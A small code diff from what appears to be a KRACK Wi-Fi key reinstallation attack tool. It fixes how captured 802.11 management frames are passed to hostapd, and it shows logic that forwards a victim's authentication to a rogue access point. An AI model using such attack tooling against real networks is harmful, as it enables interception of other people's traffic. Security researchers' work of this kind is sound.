@@ -215,7 +215,7 @@ class KRAckAttack():
 
 	def hostapd_rx_mgmt(self, p):
 		log(STATUS, "Sent frame to hostapd: %s" % dot11_to_str(p))
-		self.hostapd_ctrl.request("RX_MGMT " + p[Dot11])
+		self.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]))
 
 	def hostapd_add_sta(self, macaddr):
 		log(STATUS, "Forwarding auth to rouge AP to register client", showtime=False)
